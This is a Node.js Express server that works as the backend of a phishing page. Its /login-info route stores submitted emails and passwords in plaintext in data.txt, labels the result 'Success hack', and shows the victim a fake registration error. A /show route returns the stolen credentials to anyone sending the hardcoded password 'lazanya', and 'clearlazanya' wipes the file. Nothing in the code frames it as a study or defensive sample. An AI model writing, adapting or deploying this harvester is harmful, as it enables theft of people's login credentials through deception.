const express = require('express')
const app = express()
const path = require('path')
const fs = require('fs')
const logger = require('morgan')

const port = 4000

app.listen(port, () => {
    console.log('server work\nopen link: http://localhost:4000/')
})

app.use(express.static(path.join(__dirname, 'public')))
app.use(express.json())
app.use(logger('dev'))

app.post('/login-info', (req, res) => {
    try {
        const { email, password } = req.body
        if (!email || !password) return res.json({
            title: "Bad request",
            message: "Enter email and password"
        })

        const data = `\n-email: ${email}\n-password: ${password}\n_____________________________`

        fs.appendFileSync('data.txt', data)

        res.json({
            title: "Success hack",
            message: "An error occurred during registration. Please try again later"
        })
    } catch (e) {
        res.json({
            title: "Error",
            message: e.message
        })
    }

})

app.post('/show', (req, res) => {
    try {
        const { password } = req.body
        if (password === 'clearlazanya') fs.writeFileSync('data.txt', '')
        if (password !== 'lazanya') return res.json({
            title: "Hmm",
            message: "Get out"
        })

        const data = fs.readFileSync('data.txt', 'utf-8')

        res.json({
            title: "Success",
            data: data
        })

    } catch (e) {
        res.json({
            title: "Error",
            message: e.message
        })
    }
})